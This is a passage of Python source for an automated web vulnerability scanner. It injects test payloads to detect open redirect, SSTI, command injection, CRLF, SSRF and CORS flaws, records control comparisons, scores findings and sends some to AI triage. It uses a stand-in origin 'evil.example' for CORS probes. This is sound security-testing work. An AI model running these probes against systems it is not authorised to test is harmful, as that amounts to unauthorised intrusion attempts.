                        vuln_type="lfi",
                        severity="critical",
                        evidence=f"Confirmed LFI signature found: {matched_sig} with structural response diff",
                        payload=payload,
                        parameter=param_name,
                        request_raw=req_raw,
                        response_raw=res_raw,
                        deterministic_confirmed=True,
                        insertion_point=insertion_kind,
                    )
                )
                return

    async def _test_open_redirect(
        self,
        client,
        url: str,
        parsed,
        param_name: str,
        method: str = "GET",
        insertion_kind: str = "query",
        insertion_meta: Optional[Dict[str, Any]] = None,
    ):
        for payload in OPEN_REDIRECT_PAYLOADS:
            if self._cancel_event.is_set():
                return

            resp, elapsed, _, req_raw, res_raw = await self._inject_param(
                client, parsed, param_name, payload, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
                follow_redirects=False,
            )
            if not resp:
                await self._record_test_entry(
                    url=url,
                    method=method,
                    test_type="open_redirect",
                    parameter=param_name,
                    payload=payload,
                    stage="probe",
                    outcome="error",
                    success=False,
                    elapsed_s=float(elapsed or 0.0),
                    status_code=0,
                    evidence="Request failed",
                    request_raw=req_raw,
                    response_raw=res_raw,
                )
                continue


            if resp.status_code not in (301, 302, 303, 307, 308):
                await self._record_test_entry(
                    url=url,
                    method=method,
                    test_type="open_redirect",
                    parameter=param_name,
                    payload=payload,
                    stage="probe",
                    outcome="no_signal",
                    success=True,
                    elapsed_s=float(elapsed or 0.0),
                    status_code=resp.status_code,
                    evidence=f"No redirect status code ({resp.status_code})",
                    request_raw=req_raw,
                    response_raw=res_raw,
                )
                continue

            location = resp.headers.get("location", "")
            if not location:
                await self._record_test_entry(
                    url=url,
                    method=method,
                    test_type="open_redirect",
                    parameter=param_name,
                    payload=payload,
                    stage="probe",
                    outcome="no_signal",
                    success=True,
                    elapsed_s=float(elapsed or 0.0),
                    status_code=resp.status_code,
                    evidence="Redirect without location header",
                    request_raw=req_raw,
                    response_raw=res_raw,
                )
                continue

            redirected = urlparse(urljoin(url, location))
            host = (redirected.hostname or "").lower()
            signal = bool(host and host != self.target_host and any(m in host for m in REDIRECT_HOST_MARKERS))
            if not signal:
                await self._record_test_entry(
                    url=url,
                    method=method,
                    test_type="open_redirect",
                    parameter=param_name,
                    payload=payload,
                    stage="probe",
                    outcome="no_signal",
                    success=True,
                    elapsed_s=float(elapsed or 0.0),
                    status_code=resp.status_code,
                    evidence=f"Redirect target remained in-scope: {location}",
                    request_raw=req_raw,
                    response_raw=res_raw,
                )
                continue

            control_payload = "/"
            ctrl_resp, ctrl_elapsed, _, ctrl_req, ctrl_res = await self._inject_param(
                client, parsed, param_name, control_payload, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
                follow_redirects=False,
            )
            ctrl_signal = False
            if ctrl_resp and ctrl_resp.status_code in (301, 302, 303, 307, 308):
                ctrl_location = ctrl_resp.headers.get("location", "")
                if ctrl_location:
                    ctrl_host = (urlparse(urljoin(url, ctrl_location)).hostname or "").lower()
                    ctrl_signal = bool(ctrl_host and ctrl_host != self.target_host and any(m in ctrl_host for m in REDIRECT_HOST_MARKERS))
            confirmed = bool(signal and ctrl_resp is not None and not ctrl_signal)

            await self._record_test_entry(
                url=url,
                method=method,
                test_type="open_redirect",
                parameter=param_name,
                payload=payload,
                stage="probe",
                outcome="signal",
                success=True,
                elapsed_s=float(elapsed or 0.0),
                status_code=resp.status_code,
                evidence=f"External redirect target: {location}",
                request_raw=req_raw,
                response_raw=res_raw,
            )
            await self._record_test_entry(
                url=url,
                method=method,
                test_type="open_redirect",
                parameter=param_name,
                payload=control_payload,
                stage="control",
                outcome="no_signal" if confirmed else "signal",
                success=ctrl_resp is not None,
                elapsed_s=float(ctrl_elapsed or 0.0),
                status_code=int(ctrl_resp.status_code if ctrl_resp else 0),
                evidence=f"Control external redirect={ctrl_signal}",
                request_raw=ctrl_req,
                response_raw=ctrl_res,
            )

            if confirmed:
                await self._add_finding(
                    ScanFinding(
                        url=url,
                        vuln_type="open_redirect",
                        severity="medium",
                        evidence=f"Confirmed redirect to external host: {location}",
                        payload=payload,
                        parameter=param_name,
                        request_raw=req_raw,
                        response_raw=res_raw,
                        deterministic_confirmed=True,
                        insertion_point=insertion_kind,
                    )
                )
                return

    async def _test_oast(
        self,
        client,
        url: str,
        parsed,
        param_name: str,
        method: str = "GET",
        insertion_kind: str = "query",
        insertion_meta: Optional[Dict[str, Any]] = None,
    ):
        if not self._oast_enabled or not self._oast_base_url or not self._oast_hit_checker:
            return

        token = hashlib.md5(f"oast:{url}:{param_name}:{time.time_ns()}".encode()).hexdigest()[:16]
        if "{token}" in self._oast_base_url:
            payload = self._oast_base_url.replace("{token}", token)
        else:
            payload = f"{self._oast_base_url}/{token}"

        resp, elapsed, _, req_raw, res_raw = await self._inject_param(
            client, parsed, param_name, payload, timeout_s=12.0, method=method,
            insertion_kind=insertion_kind, insertion_meta=insertion_meta,
        )
        await self._record_test_entry(
            url=url,
            method=method,
            test_type="oast",
            parameter=param_name,
            payload=payload,
            stage="probe",
            outcome="info" if resp is not None else "error",
            success=resp is not None,
            elapsed_s=float(elapsed or 0.0),
            status_code=int(resp.status_code if resp else 0),
            evidence=f"OAST probe sent with token={token}",
            request_raw=req_raw,
            response_raw=res_raw,
        )

        hit = False
        for _ in range(5):
            if self._cancel_event.is_set():
                return
            try:
                hit = bool(await self._oast_hit_checker(token))
            except Exception:
                hit = False
            if hit:
                break
            await asyncio.sleep(0.35)

        await self._record_test_entry(
            url=url,
            method=method,
            test_type="oast",
            parameter=param_name,
            payload=payload,
            stage="confirm",
            outcome="confirmed" if hit else "no_signal",
            success=True,
            elapsed_s=0.0,
            status_code=0,
            evidence=f"OAST callback {'received' if hit else 'not observed'} for token={token}",
            request_raw="",
            response_raw="",
        )

        if hit:
            await self._add_finding(
                ScanFinding(
                    url=url,
                    vuln_type="oast_blind_interaction",
                    severity="high",
                    evidence=f"Out-of-band interaction confirmed for token={token}",
                    payload=payload,
                    parameter=param_name,
                    request_raw=req_raw,
                    response_raw=res_raw,
                    deterministic_confirmed=True,
                    insertion_point=insertion_kind,
                )
            )
            return

    # ── Passive Analysis ─────────────────────────────────────────────

    async def _passive_checks(self, url: str, resp: httpx.Response):
        """Run passive security checks on the response (no additional requests)."""
        if not resp:
            return

        req_raw = self._build_raw_request("GET", url, headers=dict(self.scan_headers or {}))
        res_raw = self._build_raw_response(resp)

        # 1. Missing security headers
        for header_name, description, severity in SECURITY_HEADERS_EXPECTED:
            if header_name not in resp.headers:
                await self._add_finding(
                    ScanFinding(
                        url=url,
                        vuln_type="missing_header",
                        severity=severity,
                        evidence=description,
                        payload="",
                        parameter=header_name,
                        request_raw=req_raw,
                        response_raw=res_raw,
                        insertion_point="passive",
                    )
                )

        # 2. Insecure cookie flags
        for cookie_header in resp.headers.get_list("set-cookie"):
            cookie_lower = cookie_header.lower()
            cookie_name = cookie_header.split("=", 1)[0].strip() if "=" in cookie_header else "unknown"
            issues = []
            if "httponly" not in cookie_lower:
                issues.append("Missing HttpOnly flag")
            if "secure" not in cookie_lower:
                issues.append("Missing Secure flag")
            if "samesite" not in cookie_lower:
                issues.append("Missing SameSite attribute")
            if issues:
                await self._add_finding(
                    ScanFinding(
                        url=url,
                        vuln_type="insecure_cookie",
                        severity="low",
                        evidence=f"Cookie '{cookie_name}': {', '.join(issues)}",
                        payload="",
                        parameter=cookie_name,
                        request_raw=req_raw,
                        response_raw=res_raw,
                        insertion_point="passive",
                    )
                )

        # 3. Information disclosure
        body_text = (resp.text or "")[:50000]
        for pattern, desc in INFO_DISCLOSURE_PATTERNS:
            match = pattern.search(body_text)
            if match:
                await self._add_finding(
                    ScanFinding(
                        url=url,
                        vuln_type="info_disclosure",
                        severity="low",
                        evidence=f"{desc}: matched '{match.group()[:80]}'",
                        payload="",
                        parameter="response_body",
                        request_raw=req_raw,
                        response_raw=res_raw,
                        insertion_point="passive",
                    )
                )

        # 4. Verbose server header
        server = resp.headers.get("server", "")
        if server and re.search(r"\d+\.\d+", server):
            await self._add_finding(
                ScanFinding(
                    url=url,
                    vuln_type="info_disclosure",
                    severity="info",
                    evidence=f"Server header exposes version: {server}",
                    payload="",
                    parameter="server",
                    request_raw=req_raw,
                    response_raw=res_raw,
                    insertion_point="passive",
                )
            )

    # ── SSTI Test ────────────────────────────────────────────────────

    async def _test_ssti(
        self,
        client,
        url: str,
        parsed,
        param_name: str,
        method: str = "GET",
        insertion_kind: str = "query",
        insertion_meta: Optional[Dict[str, Any]] = None,
    ):
        """Test for Server-Side Template Injection."""
        for entry in SSTI_PAYLOADS:
            if self._cancel_event.is_set():
                return

            payload = entry["payload"]
            expected = entry["expect"]
            engine = entry["engine"]

            resp, elapsed, _, req_raw, res_raw = await self._inject_param(
                client, parsed, param_name, payload, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )
            if not resp:
                await self._record_test_entry(
                    url=url, method=method, test_type="ssti",
                    parameter=param_name, payload=payload, stage="probe",
                    outcome="error", success=False,
                    elapsed_s=float(elapsed or 0.0), status_code=0,
                    evidence="Request failed", request_raw=req_raw, response_raw=res_raw,
                )
                continue

            body = resp.text or ""
            # Check if the expected computed result appears AND the raw template does NOT
            has_result = expected in body
            has_raw_template = payload in body  # If template is echoed back raw, not executed

            if not has_result or has_raw_template:
                await self._record_test_entry(
                    url=url, method=method, test_type="ssti",
                    parameter=param_name, payload=payload, stage="probe",
                    outcome="no_signal", success=True,
                    elapsed_s=float(elapsed or 0.0), status_code=resp.status_code,
                    evidence=f"Expected '{expected}' not computed (raw_echo={has_raw_template})",
                    request_raw=req_raw, response_raw=res_raw,
                )
                continue

            # Confirmation: try a different arithmetic to reduce FP
            confirm_payload = payload.replace("7*7", "13*37").replace("49", "481")
            confirm_expected = "481"
            resp2, elapsed2, _, req2, res2 = await self._inject_param(
                client, parsed, param_name, confirm_payload, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )
            confirmed = bool(resp2 and confirm_expected in resp2.text and confirm_payload not in resp2.text)

            await self._record_test_entry(
                url=url, method=method, test_type="ssti",
                parameter=param_name, payload=payload, stage="probe",
                outcome="signal", success=True,
                elapsed_s=float(elapsed or 0.0), status_code=resp.status_code,
                evidence=f"Template engine '{engine}' computed '{expected}' from '{payload}'",
                request_raw=req_raw, response_raw=res_raw,
            )
            await self._record_test_entry(
                url=url, method=method, test_type="ssti",
                parameter=param_name, payload=confirm_payload, stage="confirm",
                outcome="confirmed" if confirmed else "no_signal",
                success=resp2 is not None,
                elapsed_s=float(elapsed2 or 0.0),
                status_code=int(resp2.status_code if resp2 else 0),
                evidence=f"Confirm arithmetic {'matched' if confirmed else 'failed'}",
                request_raw=req2, response_raw=res2,
            )

            if confirmed:
                await self._add_finding(
                    ScanFinding(
                        url=url, vuln_type="ssti", severity="critical",
                        evidence=f"Confirmed SSTI via {engine}: '{payload}' → '{expected}', '{confirm_payload}' → '{confirm_expected}'",
                        payload=payload, parameter=param_name,
                        request_raw=req2 or req_raw, response_raw=res2 or res_raw,
                        deterministic_confirmed=True, insertion_point=insertion_kind,
                    )
                )
                return

    # ── Command Injection Test ───────────────────────────────────────

    async def _test_cmdi(
        self,
        client,
        url: str,
        parsed,
        param_name: str,
        baseline_val: str,
        method: str = "GET",
        insertion_kind: str = "query",
        insertion_meta: Optional[Dict[str, Any]] = None,
    ):
        """Test for OS Command Injection (time-based + canary)."""
        # Baseline timing
        baseline_samples: List[float] = []
        for i in range(3):
            b_resp, b_time, _, b_req, b_res = await self._inject_param(
                client, parsed, param_name, baseline_val, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )
            baseline_samples.append(float(b_time or 0.0))
            await self._record_test_entry(
                url=url, method=method, test_type="cmdi",
                parameter=param_name, payload=baseline_val, stage="baseline",
                outcome="baseline" if b_resp else "error",
                success=b_resp is not None,
                elapsed_s=float(b_time or 0.0),
                status_code=int(b_resp.status_code if b_resp else 0),
                evidence=f"Baseline timing sample {i + 1}/3",
                request_raw=b_req, response_raw=b_res,
            )

        baseline_median, baseline_std = self._median_and_std(baseline_samples)
        delay_threshold = max(3.8, baseline_median + max(1.8, baseline_std * 3.0))

        # Time-based command injection
        for payload in CMDI_TIME_PAYLOADS:
            if self._cancel_event.is_set():
                return

            resp, elapsed, _, req_raw, res_raw = await self._inject_param(
                client, parsed, param_name, payload, timeout_s=18.0, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )
            delayed = elapsed >= delay_threshold

            await self._record_test_entry(
                url=url, method=method, test_type="cmdi_time",
                parameter=param_name, payload=payload, stage="probe",
                outcome="signal" if delayed else "no_signal",
                success=resp is not None,
                elapsed_s=float(elapsed or 0.0),
                status_code=int(resp.status_code if resp else 0),
                evidence=f"elapsed={elapsed:.2f}s threshold={delay_threshold:.2f}s delayed={'yes' if delayed else 'no'}",
                request_raw=req_raw, response_raw=res_raw,
            )

            if delayed:
                # Confirm with control
                control_payload = f"{baseline_val}_cmdi_ctrl"
                ctrl_resp, ctrl_elapsed, _, ctrl_req, ctrl_res = await self._inject_param(
                    client, parsed, param_name, control_payload, timeout_s=18.0, method=method,
                    insertion_kind=insertion_kind, insertion_meta=insertion_meta,
                )
                ctrl_delayed = ctrl_elapsed >= delay_threshold
                confirmed = not ctrl_delayed

                await self._record_test_entry(
                    url=url, method=method, test_type="cmdi_time",
                    parameter=param_name, payload=control_payload, stage="control",
                    outcome="no_signal" if confirmed else "signal",
                    success=ctrl_resp is not None,
                    elapsed_s=float(ctrl_elapsed or 0.0),
                    status_code=int(ctrl_resp.status_code if ctrl_resp else 0),
                    evidence=f"Control elapsed={ctrl_elapsed:.2f}s delayed={'yes' if ctrl_delayed else 'no'}",
                    request_raw=ctrl_req, response_raw=ctrl_res,
                )

                if confirmed:
                    await self._add_finding(
                        ScanFinding(
                            url=url, vuln_type="cmdi", severity="critical",
                            evidence=(
                                f"Time-based OS command injection confirmed. "
                                f"Payload elapsed={elapsed:.2f}s, control={ctrl_elapsed:.2f}s, "
                                f"threshold={delay_threshold:.2f}s"
                            ),
                            payload=payload, parameter=param_name,
                            request_raw=req_raw, response_raw=res_raw,
                            deterministic_confirmed=True, insertion_point=insertion_kind,
                        )
                    )
                    return

        # Canary-based command injection
        for entry in CMDI_CANARY_PAYLOADS:
            if self._cancel_event.is_set():
                return

            canary = hashlib.md5(f"cmdi:{url}:{param_name}:{time.time_ns()}".encode()).hexdigest()[:12]
            payload = entry["payload"].replace("{canary}", canary)
            resp, elapsed, _, req_raw, res_raw = await self._inject_param(
                client, parsed, param_name, payload, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )

            reflected = bool(resp and canary in (resp.text or ""))

            await self._record_test_entry(
                url=url, method=method, test_type="cmdi_canary",
                parameter=param_name, payload=payload, stage="probe",
                outcome="signal" if reflected else "no_signal",
                success=resp is not None,
                elapsed_s=float(elapsed or 0.0),
                status_code=int(resp.status_code if resp else 0),
                evidence=f"Canary '{canary}' {'found' if reflected else 'not found'} in response",
                request_raw=req_raw, response_raw=res_raw,
            )

            if reflected:
                await self._add_finding(
                    ScanFinding(
                        url=url, vuln_type="cmdi", severity="critical",
                        evidence=f"OS command injection: canary '{canary}' reflected via '{payload}'",
                        payload=payload, parameter=param_name,
                        request_raw=req_raw, response_raw=res_raw,
                        deterministic_confirmed=True, insertion_point=insertion_kind,
                    )
                )
                return

    # ── CRLF / Header Injection Test ─────────────────────────────────

    async def _test_crlf(
        self,
        client,
        url: str,
        parsed,
        param_name: str,
        method: str = "GET",
        insertion_kind: str = "query",
        insertion_meta: Optional[Dict[str, Any]] = None,
    ):
        """Test for CRLF injection / HTTP header injection."""
        for payload in CRLF_PAYLOADS:
            if self._cancel_event.is_set():
                return

            resp, elapsed, _, req_raw, res_raw = await self._inject_param(
                client, parsed, param_name, payload, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )
            if not resp:
                await self._record_test_entry(
                    url=url, method=method, test_type="crlf",
                    parameter=param_name, payload=payload, stage="probe",
                    outcome="error", success=False,
                    elapsed_s=float(elapsed or 0.0), status_code=0,
                    evidence="Request failed", request_raw=req_raw, response_raw=res_raw,
                )
                continue

            # Check if our injected header appears in response headers
            headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            header_injected = CRLF_HEADER_MARKER in headers_lower
            cookie_injected = CRLF_COOKIE_MARKER in (headers_lower.get("set-cookie", "") or "").lower()
            signal = header_injected or cookie_injected

            await self._record_test_entry(
                url=url, method=method, test_type="crlf",
                parameter=param_name, payload=payload, stage="probe",
                outcome="signal" if signal else "no_signal",
                success=True,
                elapsed_s=float(elapsed or 0.0), status_code=resp.status_code,
                evidence=f"Header injected={header_injected}, cookie injected={cookie_injected}",
                request_raw=req_raw, response_raw=res_raw,
            )

            if signal:
                await self._add_finding(
                    ScanFinding(
                        url=url, vuln_type="crlf", severity="medium",
                        evidence=f"CRLF injection confirmed: {'header' if header_injected else 'cookie'} injection via '{payload}'",
                        payload=payload, parameter=param_name,
                        request_raw=req_raw, response_raw=res_raw,
                        deterministic_confirmed=True, insertion_point=insertion_kind,
                    )
                )
                return

    # ── SSRF Test ────────────────────────────────────────────────────

    async def _test_ssrf(
        self,
        client,
        url: str,
        parsed,
        param_name: str,
        method: str = "GET",
        insertion_kind: str = "query",
        insertion_meta: Optional[Dict[str, Any]] = None,
    ):
        """Test for Server-Side Request Forgery."""
        # Only test params that look like they accept URLs/paths
        name_lower = param_name.lower()
        url_like = any(kw in name_lower for kw in ("url", "uri", "path", "file", "src", "href", "redirect", "next", "dest", "fetch", "load"))
        if not url_like and insertion_kind not in ("query", "body_form", "body_json"):
            return

        for payload in SSRF_PAYLOADS:
            if self._cancel_event.is_set():
                return

            resp, elapsed, _, req_raw, res_raw = await self._inject_param(
                client, parsed, param_name, payload, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )
            if not resp:
                await self._record_test_entry(
                    url=url, method=method, test_type="ssrf",
                    parameter=param_name, payload=payload, stage="probe",
                    outcome="error", success=False,
                    elapsed_s=float(elapsed or 0.0), status_code=0,
                    evidence="Request failed", request_raw=req_raw, response_raw=res_raw,
                )
                continue

            body = (resp.text or "").lower()
            matched_sig = ""
            for sig in SSRF_SIGNATURES:
                if sig.lower() in body:
                    matched_sig = sig
                    break

            if not matched_sig:
                await self._record_test_entry(
                    url=url, method=method, test_type="ssrf",
                    parameter=param_name, payload=payload, stage="probe",
                    outcome="no_signal", success=True,
                    elapsed_s=float(elapsed or 0.0), status_code=resp.status_code,
                    evidence="No SSRF signatures in response",
                    request_raw=req_raw, response_raw=res_raw,
                )
                continue

            # Control: send a non-internal URL
            ctrl_resp, ctrl_elapsed, _, ctrl_req, ctrl_res = await self._inject_param(
                client, parsed, param_name, "http://example.invalid/notexist", method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )
            ctrl_has_sig = False
            if ctrl_resp:
                ctrl_body = (ctrl_resp.text or "").lower()
                ctrl_has_sig = any(sig.lower() in ctrl_body for sig in SSRF_SIGNATURES)
            confirmed = not ctrl_has_sig

            await self._record_test_entry(
                url=url, method=method, test_type="ssrf",
                parameter=param_name, payload=payload, stage="probe",
                outcome="signal", success=True,
                elapsed_s=float(elapsed or 0.0), status_code=resp.status_code,
                evidence=f"SSRF signature '{matched_sig}' found in response",
                request_raw=req_raw, response_raw=res_raw,
            )
            await self._record_test_entry(
                url=url, method=method, test_type="ssrf",
                parameter=param_name, payload="http://example.invalid/notexist",
                stage="control",
                outcome="no_signal" if confirmed else "signal",
                success=ctrl_resp is not None,
                elapsed_s=float(ctrl_elapsed or 0.0),
                status_code=int(ctrl_resp.status_code if ctrl_resp else 0),
                evidence=f"Control SSRF sig present={ctrl_has_sig}",
                request_raw=ctrl_req, response_raw=ctrl_res,
            )

            if confirmed:
                await self._add_finding(
                    ScanFinding(
                        url=url, vuln_type="ssrf", severity="critical",
                        evidence=f"SSRF confirmed: internal resource signature '{matched_sig}' found via '{payload}'",
                        payload=payload, parameter=param_name,
                        request_raw=req_raw, response_raw=res_raw,
                        deterministic_confirmed=True, insertion_point=insertion_kind,
                    )
                )
                return

    # ── CORS Misconfiguration Test ───────────────────────────────────

    async def _test_cors(
        self,
        client: httpx.AsyncClient,
        url: str,
        parsed,
    ):
        """Test for CORS misconfiguration (origin reflection)."""
        evil_origin = "https://evil.example"
        self._tests_total += 1
        started = time.perf_counter()

        try:
            headers = dict(self.scan_headers or {})
            headers["Origin"] = evil_origin
            resp = await client.get(url, headers=headers, timeout=10.0)
            elapsed = time.perf_counter() - started
            self._requests_sent += 1
            self._tests_completed += 1
            await self._emit_progress()

            req_raw = self._build_raw_request("GET", url, headers=headers)
            res_raw = self._build_raw_response(resp)

            acao = (resp.headers.get("access-control-allow-origin") or "").strip()
            acac = (resp.headers.get("access-control-allow-credentials") or "").strip().lower()

            reflects_origin = acao == evil_origin
            allows_creds = acac == "true"
            wildcard_with_creds = acao == "*" and allows_creds

            signal = reflects_origin or wildcard_with_creds
            severity = "high" if (reflects_origin and allows_creds) else ("medium" if signal else "info")

            await self._record_test_entry(
                url=url, method="GET", test_type="cors",
                parameter="Origin", payload=evil_origin, stage="probe",
                outcome="signal" if signal else "no_signal",
                success=True,
                elapsed_s=float(elapsed or 0.0), status_code=resp.status_code,
                evidence=f"ACAO={acao}, ACAC={acac}, reflects_evil={reflects_origin}",
                request_raw=req_raw, response_raw=res_raw,
            )

            if signal:
                if reflects_origin and allows_creds:
                    evidence = f"CORS reflects arbitrary origin '{evil_origin}' with credentials allowed"
                elif reflects_origin:
                    evidence = f"CORS reflects arbitrary origin '{evil_origin}'"
                else:
                    evidence = f"CORS wildcard (*) with Allow-Credentials: true"

                await self._add_finding(
                    ScanFinding(
                        url=url, vuln_type="cors", severity=severity,
                        evidence=evidence,
                        payload=evil_origin, parameter="Origin",
                        request_raw=req_raw, response_raw=res_raw,
                        deterministic_confirmed=True, insertion_point="header",
                    )
                )
        except Exception:
            elapsed = time.perf_counter() - started
            self._errors_count += 1
            self._tests_completed += 1
            await self._emit_progress()

    @staticmethod
    def _finding_fingerprint(finding: ScanFinding) -> str:
        raw = f"{finding.url}|{finding.vuln_type}|{finding.parameter}|{finding.payload}"
        return hashlib.md5(raw.encode()).hexdigest()

    @staticmethod
    def _severity_weight(sev: str) -> int:
        s = str(sev or "").lower()
        if s == "critical":
            return 18
        if s == "high":
            return 12
        if s == "medium":
            return 7
        if s == "low":
            return 3
        return 0

    def _feedback_score_adjustment(self, finding: ScanFinding) -> int:
        """Adjust score from analyst feedback for equivalent findings."""
        fp = self._finding_fingerprint(finding)
        bucket = dict((self._feedback_stats or {}).get(fp, {}) or {})
        tp = int(bucket.get("true_positive", 0) or 0)
        fp_count = int(bucket.get("false_positive", 0) or 0)
        total = tp + fp_count
        if total <= 0:
            return 0
        # Keep adjustment bounded so technical evidence still dominates.
        delta = ((tp - fp_count) / total) * 10.0
        return int(max(-10.0, min(10.0, delta)))

    def _calculate_finding_score(self, finding: ScanFinding) -> int:
        base = {
            "xss": 68,
            "sqli": 78,
            "path_traversal": 76,
            "lfi": 80,
            "open_redirect": 58,
            "oast_blind_interaction": 82,
            "ssti": 84,
            "cmdi": 86,
            "crlf": 54,
            "ssrf": 82,
            "cors": 50,
            "missing_header": 12,
            "insecure_cookie": 18,
            "info_disclosure": 22,
            "discovery": 30,
            "info": 18,
        }.get(str(finding.vuln_type or "").lower(), 40)
        score = base + self._severity_weight(finding.severity)
        ev = (finding.evidence or "").lower()
        if "confirmed" in ev:
            score += 14
        if "control" in ev:
            score += 6
        if "structural response diff" in ev:
            score += 6
        if finding.insertion_point in {"cookie", "header", "path"}:
            score += 2
        if finding.deterministic_confirmed:
            score += 10
        if finding.ai_analysis:
            verdict = str((finding.ai_analysis or {}).get("verdict", "")).lower()
            try:
                conf = float((finding.ai_analysis or {}).get("confidence", 0.0) or 0.0)
            except (TypeError, ValueError):
                conf = 0.0
            if verdict == "likely_false_positive":
                score -= int(20 * max(0.2, conf))
            elif verdict == "confirmed":
                score += int(10 * max(0.2, conf))
        if not finding.request_raw and not finding.response_raw:
            score -= 8
        score += self._feedback_score_adjustment(finding)
        return max(0, min(100, int(score)))

    def _finding_is_ambiguous(self, finding: ScanFinding) -> bool:
        return (not finding.deterministic_confirmed) or (finding.score < 80)

    async def _add_finding(self, finding: ScanFinding):
        """Add a finding, dedup by hash."""
        h = hashlib.md5(f"{finding.url}:{finding.vuln_type}:{finding.parameter}".encode()).hexdigest()
        if h in self._findings_hashes:
            return

        finding.score = self._calculate_finding_score(finding)
        self._findings_hashes.add(h)
        await self._verify_finding_with_ai(finding)
        finding.score = self._calculate_finding_score(finding)
        self.findings.append(finding)

        if self.broadcast:
            await self.broadcast("scanner_finding", finding.to_dict())
            await self._emit_progress(
                force=True,
                activity={
                    "type": "finding",
                    "url": finding.url,
                    "message": f"{finding.vuln_type.upper()} found on {finding.parameter or 'global'}",
                    "severity": finding.severity,
                },
            )

    async def _verify_finding_with_ai(self, finding: ScanFinding):
        """Optionally enrich findings with AI triage data."""
        cfg = self.ai_config if isinstance(self.ai_config, dict) else {}
        if not cfg.get("enabled") or not cfg.get("verify_findings") or not self.ai_analyzer:
            return

        review_scope = str(cfg.get("review_scope", "ambiguous_or_high") or "ambiguous_or_high").lower()
        max_reviews = cfg.get("max_reviews_per_scan", 20)
        try:
            max_reviews = int(max_reviews)
        except (TypeError, ValueError):
            max_reviews = 20
        max_reviews = max(0, min(max_reviews, 200))
        cache_enabled = bool(cfg.get("cache_enabled", True))
        severity = str(finding.severity or "").lower()
        is_high = severity in {"high", "critical"}
        is_ambiguous = self._finding_is_ambiguous(finding)

        should_review = True
        if review_scope == "high_only":
            should_review = is_high
        elif review_scope == "ambiguous_or_high":
            should_review = is_ambiguous or is_high
        elif review_scope == "all":
            should_review = True

        if not should_review:
            finding.ai_analysis = {
                "provider": str(cfg.get("provider", "") or ""),
                "model": str(cfg.get("model", "") or ""),
                "verdict": "needs_manual_review",
                "confidence": 0.0,
                "reasoning": "AI skipped by gating policy (not high severity and not ambiguous).",
                "follow_up_tests": [],
                "skipped": True,
            }
            return

        if max_reviews == 0 or self._ai_reviews_used >= max_reviews:
            finding.ai_analysis = {
                "provider": str(cfg.get("provider", "") or ""),
                "model": str(cfg.get("model", "") or ""),
                "verdict": "needs_manual_review",
                "confidence": 0.0,
                "reasoning": f"AI budget exhausted for this scan ({self._ai_reviews_used}/{max_reviews}).",
                "follow_up_tests": [],
                "skipped": True,
            }
            return

        provider = str(cfg.get("provider", "") or "").lower()
        model = str(cfg.get("model", "") or "")
        fp = self._finding_fingerprint(finding)
        if cache_enabled and fp in self._ai_cache:
            cached = dict(self._ai_cache[fp] or {})
            cached["cached"] = True
            finding.ai_analysis = cached
            await self._emit_progress(
                force=True,
                activity={
                    "type": "ai_review_done",
                    "url": finding.url,
                    "message": f"AI cache hit for {finding.vuln_type.upper()} ({provider}:{model})",
                },
            )
            return

        await self._emit_progress(
            force=True,
            activity={
                "type": "ai_review_start",
                "url": finding.url,
                "message": f"AI verifying {finding.vuln_type.upper()} ({provider}:{model})",
            },
        )

        timeout_s = cfg.get("timeout_seconds", 20)
        try:
            timeout_s = float(timeout_s)
        except (TypeError, ValueError):
            timeout_s = 20.0
        timeout_s = max(6.0, min(timeout_s + 2.0, 130.0))

        started = time.perf_counter()
        try:
            finding_payload = finding.to_dict()
            feedback = dict((self._feedback_stats or {}).get(fp, {}) or {})
            if feedback:
                finding_payload["feedback_hint"] = feedback
            self._ai_reviews_used += 1
            analysis = await asyncio.wait_for(self.ai_analyzer(cfg, finding_payload), timeout=timeout_s)
            if isinstance(analysis, dict):
                finding.ai_analysis = analysis
                if cache_enabled:
                    self._ai_cache[fp] = dict(analysis)
                    cfg["runtime_cache"] = self._ai_cache
            verdict = str((finding.ai_analysis or {}).get("verdict", "needs_manual_review"))
            confidence = (finding.ai_analysis or {}).get("confidence", 0.0)
            try:
                confidence = float(confidence)
            except (TypeError, ValueError):
                confidence = 0.0
            elapsed_ms = int((time.perf_counter() - started) * 1000)
            await self._emit_progress(
                force=True,
                activity={
                    "type": "ai_review_done",
                    "url": finding.url,
                    "message": (
                        f"AI verdict for {finding.vuln_type.upper()}: "
                        f"{verdict} ({int(confidence * 100)}%) in {elapsed_ms}ms "
                        f"[{self._ai_reviews_used}/{max_reviews}]"
                    ),
                },
            )
        except Exception as exc:
            finding.ai_analysis = {
                "provider": provider,
                "model": model,
                "verdict": "needs_manual_review",
                "confidence": 0.0,
                "reasoning": f"AI verification failed: {str(exc)[:200]}",
                "follow_up_tests": [],
            }
            await self._emit_progress(
                force=True,
                activity={
                    "type": "ai_review_error",
                    "url": finding.url,
                    "message": f"AI verification failed: {str(exc)[:180]}",
                },
            )
